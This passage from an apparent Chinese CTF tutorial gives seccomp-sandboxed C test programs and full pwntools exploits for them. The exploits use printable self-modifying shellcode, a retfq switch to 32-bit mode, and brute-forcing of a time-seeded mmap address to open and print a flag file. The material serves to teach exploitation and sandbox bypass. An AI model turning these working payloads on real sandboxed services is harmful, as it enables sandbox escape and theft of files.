&#125;;<br><br>    prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    sandbox();<br>    <span class="hljs-type">void</span> *buf = (<span class="hljs-type">void</span> *) syscall(SYS_mmap,<span class="hljs-number">0x500000</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>,MAP_SHARED|MAP_ANONYMOUS,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>    syscall(SYS_write,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;shellcode: &quot;</span>,<span class="hljs-number">11</span>);<br>    <span class="hljs-type">size_t</span> len = syscall(SYS_read,<span class="hljs-number">0</span>,buf,<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;len<span class="hljs-number">-1</span> ; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(buf[i]&lt;=<span class="hljs-number">0x1f</span> || buf[i]&gt;= <span class="hljs-number">0x7f</span>)<br>            syscall(SYS_exit_group,<span class="hljs-number">-1</span>);<br>    &#125;<br>    ((<span class="hljs-type">void</span> (*)())buf)();<br>    syscall(SYS_exit_group,<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>下面的exp可以打通上面的程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>append = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">/* 机器码: 52 5a */</span><br><span class="hljs-string">push rdx</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode_x86 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">/*fp = open(&quot;flag&quot;)*/</span><br><span class="hljs-string">mov esp,0x40404140</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* s = &quot;flag&quot; */</span><br><span class="hljs-string">push 0x67616c66</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* ebx = &amp;s */</span><br><span class="hljs-string">push esp</span><br><span class="hljs-string">pop ebx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* ecx = 0 */</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov eax,5</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov ecx,eax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode_flag = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">/* retfq:  mode_32 -&gt; mode_64*/</span><br><span class="hljs-string">push 0x33</span><br><span class="hljs-string">push 0x40404089</span><br><span class="hljs-string">retfq</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*read(fp,buf,0x70)*/</span><br><span class="hljs-string">mov rdi,rcx</span><br><span class="hljs-string">mov rsi,rsp</span><br><span class="hljs-string">mov rdx,0x70</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*write(1,buf,0x70)*/</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># 0x40404040 为32位shellcode地址</span><br>shellcode_mmap = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push rdx /* 将这段shellcode的起始地址保存到rbx中,rdx根据call的寄存器进行修改 */</span><br><span class="hljs-string">pop rbx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*mmap(0x40404040,0x7e,7,33,-1,0)*/</span><br><span class="hljs-string">push 0x40404040 /*set rdi*/</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x7e /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdx*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x47</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set r10*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x61</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop r10</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set r8*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop r8</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rax /*set r9*/</span><br><span class="hljs-string">pop r9</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">/* syscall 的机器码是 0f 05, 都是不可打印字符. */</span><br><span class="hljs-string">/* 用异或运算来解决这个问题: 0x0f = 0x5d^0x52, 0x05 = 0x5f^0x5a. */</span><br><span class="hljs-string">/* 其中 0x52,0x5a 由 append 提供. */</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x3b],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x3c],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x22 /*set rcx*/</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40/*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x49</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode_read = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">/*read(0,0x40404040,0x70)*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40404040 /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdi*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40 /*set rdx*/</span><br><span class="hljs-string">push 0x70</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x61],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x62],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rdx /*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x70</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode_retfq = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">/*mode_64 -&gt; mode_32*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x72</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x4a],cl</span><br><span class="hljs-string">push 0x68</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x4a],cl</span><br><span class="hljs-string">push 0x47</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x4b],cl</span><br><span class="hljs-string">push 0x48</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x4b],cl</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push 0x23</span><br><span class="hljs-string">push 0x40404040</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode_x86 = asm(shellcode_x86 ,arch = <span class="hljs-string">&#x27;i386&#x27;</span>)<br>shellcode_flag = asm(shellcode_flag, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>shellcode = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># mmap</span><br>shellcode += shellcode_mmap<br>shellcode += append<br><br><span class="hljs-comment"># read shellcode</span><br>shellcode += shellcode_read<br>shellcode += append<br><br><span class="hljs-comment"># mode_64 -&gt; mode_32</span><br>shellcode += shellcode_retfq<br>shellcode += append<br><br>shellcode = asm(shellcode,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;shellcode: &quot;</span>)<br><br>p.sendline(shellcode)<br>sleep(<span class="hljs-number">3</span>)<br><br>p.sendline(shellcode_x86 + <span class="hljs-number">0x29</span>*<span class="hljs-string">b&#x27;\x90&#x27;</span> + shellcode_flag)<br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="fstat-read-write"><a href="#fstat-read-write" class="headerlink" title="fstat read write"></a>fstat read write</h4><blockquote><p>比上一题少了一个mmap，这种一般会提前用mmap申请一块rwx的内存，并且内存地址是小于32位地址长度限制的</p></blockquote><p>测试程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sandbox</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[]=</span>&#123;<br>        BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class="hljs-number">0</span>),<br>        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(fstat), <span class="hljs-number">4</span>, <span class="hljs-number">0</span>),<br>        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(read), <span class="hljs-number">3</span>, <span class="hljs-number">0</span>),<br>        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(write), <span class="hljs-number">2</span>, <span class="hljs-number">0</span>),<br>        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(exit_group), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>),<br>        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),<br>        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW)<br>    &#125;;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> <span class="hljs-title">prog</span>=</span>&#123;<br>        .len=<span class="hljs-keyword">sizeof</span>(filter)/<span class="hljs-keyword">sizeof</span>(filter[<span class="hljs-number">0</span>]),<br>        .filter=filter,<br>    &#125;;<br><br>    prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br>    srand(time(<span class="hljs-number">0</span>));<br>    <span class="hljs-type">int</span> res = rand() % <span class="hljs-number">0x7fffffff</span>;<br>    <span class="hljs-type">char</span> *dest = (<span class="hljs-type">char</span> *) syscall(SYS_mmap,res,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>,MAP_SHARED|MAP_ANONYMOUS,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>    sandbox();<br>    syscall(SYS_write,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;shellcode: &quot;</span>,<span class="hljs-number">11</span>);<br>    <span class="hljs-type">size_t</span> len = syscall(SYS_read,<span class="hljs-number">0</span>,buf,<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i&lt;len<span class="hljs-number">-1</span> ; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(buf[i]&lt;=<span class="hljs-number">0x1f</span> || buf[i]&gt;= <span class="hljs-number">0x7f</span>)<br>            syscall(SYS_exit_group,<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">strcpy</span>(dest,buf);<br>    ((<span class="hljs-type">void</span> (*)())dest)();<br>    syscall(SYS_exit_group,<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>mmap申请的地址是随机的，但是肯定小于32位地址长度限制<br>并且会检测输入是否为可打印字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctypes<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>clibc = ctypes.CDLL(<span class="hljs-string">&quot;/lib/libc.so.6&quot;</span>)<br>addr = <span class="hljs-number">0</span><br>dest = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># 由于shellcode中用到了addr，所以需要addr为可打印字符，因此需要爆破一下</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(<span class="hljs-string">&quot;./pwn3&quot;</span>)<br>    clibc.srand(clibc.time(<span class="hljs-number">0</span>))<br>    dest = clibc.rand() % <span class="hljs-number">0x7FFFFFFF</span><br>    dest = dest &amp; <span class="hljs-number">0xFFFFF000</span> <span class="hljs-comment"># mmap内存对齐</span><br>    addr = dest + <span class="hljs-number">0x550</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (isprint(p32(addr)[<span class="hljs-number">0</span>]) <span class="hljs-keyword">and</span> isprint(p32(addr)[<span class="hljs-number">1</span>]) <span class="hljs-keyword">and</span> isprint(p32(addr)[<span class="hljs-number">2</span>]) <span class="hljs-keyword">and</span> isprint(p32(addr)[<span class="hljs-number">3</span>])):<br>        p.close()<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">break</span><br><br>shellcode_x86 = <span class="hljs-string">f&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov esp,<span class="hljs-subst">&#123;addr+<span class="hljs-number">0x100</span>&#125;</span></span><br><span class="hljs-string">push 0x67616c66</span><br><span class="hljs-string">push esp</span><br><span class="hljs-string">pop ebx</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">mov eax,5</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">mov ecx,eax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode_flag = <span class="hljs-string">f&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push 0x33</span><br><span class="hljs-string">push <span class="hljs-subst">&#123;addr+<span class="hljs-number">0x49</span>&#125;</span></span><br><span class="hljs-string">retfq</span><br><span class="hljs-string">mov rdi,rcx</span><br><span class="hljs-string">mov rsi,rsp</span><br><span class="hljs-string">mov rdx,0x70</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode_read = <span class="hljs-string">f&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push rdx /* 同样的,将本段shellcode的起始位置保存到rbx中 */</span><br><span class="hljs-string">pop rbx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*read(0,addr,0x70)*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">push <span class="hljs-subst">&#123;addr&#125;</span> /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdi*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40 /*set rdx*/</span><br><span class="hljs-string">push 0x70</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x26],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x27],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rdx /*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x70</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>append = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">/* 52 5a */</span><br><span class="hljs-string">push rdx</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode_retfq = <span class="hljs-string">f&#x27;&#x27;&#x27;</span><br><span class="hljs-string">/*mode_64 -&gt; mode_32*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x72</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x4d],cl</span><br><span class="hljs-string">push 0x68</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x4d],cl</span><br><span class="hljs-string">push 0x47</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x4e],cl</span><br><span class="hljs-string">push 0x48</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x4e],cl</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push 0x23</span><br><span class="hljs-string">push <span class="hljs-subst">&#123;addr&#125;</span></span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode_x86 = asm(shellcode_x86, arch=<span class="hljs-string">&#x27;i386&#x27;</span>)<br>shellcode_flag = asm(shellcode_flag, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>shellcode = shellcode_read + append<br>shellcode += shellcode_retfq + append<br>shellcode = asm(shellcode,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;shellcode: &#x27;</span>)<br>p.send(shellcode)<br>sleep(<span class="hljs-number">3</span>)<br>p.sendline(shellcode_x86 + <span class="hljs-number">0x29</span>*<span class="hljs-string">b&#x27;\x90&#x27;</span> + shellcode_flag)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="fork-ptrace"><a href="#fork-ptrace" class="headerlink" title="fork ptrace"></a>fork 